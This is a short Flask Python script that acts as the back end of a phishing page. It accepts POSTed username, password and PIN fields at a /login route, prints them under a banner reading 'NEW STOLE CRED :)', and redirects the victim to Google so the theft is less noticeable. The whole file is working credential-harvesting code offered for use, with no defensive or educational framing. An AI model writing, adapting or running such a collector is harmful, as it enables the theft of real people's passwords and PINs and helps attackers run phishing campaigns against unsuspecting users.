from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    pin = request.form.get('pin')
    print('--------------- NEW STOLE CRED :) ----------------')
    print(f'username: {username}')
    print(f'password: {password}')
    print(f'pin: {pin}')
    return redirect('https://google.com/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)